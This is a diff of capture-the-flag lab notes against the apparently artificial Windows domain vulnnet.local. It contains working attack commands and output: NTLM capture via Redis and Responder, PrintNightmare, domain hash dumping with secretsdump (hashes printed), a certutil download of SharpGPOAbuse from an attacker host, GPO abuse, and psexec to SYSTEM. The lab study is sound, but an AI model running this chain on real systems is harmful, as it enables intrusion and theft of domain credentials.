@@ -1,6 +1,14 @@
 
 
 
+(different ip due coming back to enhance notes)
+┌──(root㉿kali)-[/home/kali]
+└─# redis-cli -h 10.64.151.193
+10.64.151.193:6379> config set dir \\192.168.141.97\share\fake.dll
+(error) ERR Changing directory: Permission denied
+10.64.151.193:6379> 
+
+
 ┌──(root㉿kali)-[~]
 └─# sudo responder -I tun0 -dwv
                                          __
@@ -57,6 +65,8 @@ Unable to connect with SMB1 -- no workgroup available
 ┌──(root㉿kali)-[~]
 └─# 
 
+we see there is one file in the smb share, and assume it is ran on a schedule
+so we replace it
 
 ┌──(root㉿kali)-[/home/kali]
 └─# smbclient //10.201.40.21/Enterprise-Share -U enterprise-security
@@ -141,29 +151,105 @@ OSArchitecture
 64-bit          
 
 
-
+PS C:\Users\enterprise-security\Downloads> Invoke-Nightmare
 PS C:\Users\enterprise-security\Downloads> 
 
-machine timeout -- ip change
+by default this creates an admin user for us
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-secretsdump -just-dc adm1n:P\@ssw0rd@10.64.151.193
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:85d1fadbe37887ed63987f822acb47f1:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:66d7c6f99b03f0d7f520e1e0e55f9149:::
+vulnnet.local\enterprise-security:1103:aad3b435b51404eeaad3b435b51404ee:41ab3f4e60ca2215f8ae1b79b23edc10:::
+vulnnet.local\jack-goldenhand:1104:aad3b435b51404eeaad3b435b51404ee:0f27eaa88eeed8637b2f38d0f2c8dab4:::
+vulnnet.local\tony-skid:1105:aad3b435b51404eeaad3b435b51404ee:aadd887bcc436ae6787c876f3bf118fe:::
+adm1n:1106:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+VULNNET-BC3TCK1$:1000:aad3b435b51404eeaad3b435b51404ee:85b463cfb826dfb97ac4555ecd3af605:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:f934989469a533a37eef073269e0a16010922322de4cf6aa872a883dce2bcdeb
+Administrator:aes128-cts-hmac-sha1-96:f83f7229c7f5a79ad0a860a3f92cad6b
+Administrator:des-cbc-md5:04384adc4526ef1f
+krbtgt:aes256-cts-hmac-sha1-96:5e2c631e761bf5cb7e6a3c96d55bf33a69701d25f1d8f6e45af86d1a198c7091
+krbtgt:aes128-cts-hmac-sha1-96:3ee4da3697d6793065e42e86f0460801
+krbtgt:des-cbc-md5:4a3e8301c75289f8
+vulnnet.local\enterprise-security:aes256-cts-hmac-sha1-96:a09a71a596055e698f9b9307f24daeebb8297a1bc6ebb6a05868c42d50cbafea
+vulnnet.local\enterprise-security:aes128-cts-hmac-sha1-96:9390fc3f4e8b3d222c7faccb8e506572
+vulnnet.local\enterprise-security:des-cbc-md5:dab90e0738fb32fe
+vulnnet.local\jack-goldenhand:aes256-cts-hmac-sha1-96:82a1ef123ad1c51d2cd37ec78a60170e48999d89b5776b672d970e6338048eb3
+vulnnet.local\jack-goldenhand:aes128-cts-hmac-sha1-96:2cbb450a73a4514068ecfac923ad75d6
+vulnnet.local\jack-goldenhand:des-cbc-md5:4338765bbc29516e
+vulnnet.local\tony-skid:aes256-cts-hmac-sha1-96:bbec9db669aa5d2db0bc53054253b09a5b392163801b8bc6a4a744bb4f33ed14
+vulnnet.local\tony-skid:aes128-cts-hmac-sha1-96:74c8ed411d6a69baa14d4fa123d19dc1
+vulnnet.local\tony-skid:des-cbc-md5:0846ef3e5eea433b
+adm1n:aes256-cts-hmac-sha1-96:3ed75de36638d143cee51ce49e264d3be7be28f333a969533f63f126454b83d4
+adm1n:aes128-cts-hmac-sha1-96:cef975cb3897a90846659d169fa3f713
+adm1n:des-cbc-md5:100d8ac823d33843
+VULNNET-BC3TCK1$:aes256-cts-hmac-sha1-96:8b5b2244784013740dc87d5bad82f2a0a7ea1691f459bbfaad3978d6f5fc880d
+VULNNET-BC3TCK1$:aes128-cts-hmac-sha1-96:c769a44e2b678a5f6ecf09cbbb9b6ccb
+VULNNET-BC3TCK1$:des-cbc-md5:eaf81fbc20ad385b
+[*] Cleaning up... 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
 
 
 
-PS C:\Users\enterprise-security\Downloads> .\SharpGPOAbuse.exe --AddComputerTask --TaskName 'pwn' --Author 'vulnnet\administrator' --Command "powershell.exe /c" --Arguments "net localgroup administrators enterprise-security /add" --GPOName "security-pol-vn"
+
+
+or we could use BloodHound
+see that enterprise-security has GenericWrite on SECURITY-POL-VN, a GPO that is applied to the domain
+
+PS C:\Users\enterprise-security\Downloads> certutil -f -urlcache http://192.168.141.97/SharpGPOAbuse.exe Sharp.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+PS C:\Users\enterprise-security\Downloads> ./Sharp.exe --AddLocalAdmin --UserAccount enterprise-security --GPOName "SECURITY-POL-VN"
 [+] Domain = vulnnet.local
 [+] Domain Controller = VULNNET-BC3TCK1SHNQ.vulnnet.local
 [+] Distinguished Name = CN=Policies,CN=System,DC=vulnnet,DC=local
-[+] GUID of "security-pol-vn" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
-[+] Creating file \\vulnnet.local\SysVol\vulnnet.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
+[+] SID Value of enterprise-security = S-1-5-21-1405206085-1650434706-76331420-1103
+[+] GUID of "SECURITY-POL-VN" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
+[+] File exists: \\vulnnet.local\SysVol\vulnnet.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+[+] The GPO does not specify any group memberships.
 [+] versionNumber attribute changed successfully
 [+] The version number in GPT.ini was increased successfully.
-[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
+[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
 [+] Done!
+PS C:\Users\enterprise-security\Downloads> gpupdate /force
+Updating policy...
+
+
+
+Computer Policy update has completed successfully.
+
+User Policy update has completed successfully.
+
+
+
 PS C:\Users\enterprise-security\Downloads> 
 
 
-still didnt work. nothing presented by any other writeups online seemed to work either.
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-psexec enterprise-security:sand_0873959498@10.64.151.193 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
-will come back.
+[*] Requesting shares on 10.64.151.193.....
+[*] Found writable share ADMIN$
+[*] Uploading file PyOtTjBG.exe
+[*] Opening SVCManager on 10.64.151.193.....
+[*] Creating service pbJM on 10.64.151.193.....
+[*] Starting service pbJM.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1757]
+(c) 2018 Microsoft Corporation. All rights reserved.
 
+C:\Windows\system32> whoami
+nt authority\system
 
+C:\Windows\system32> 
 
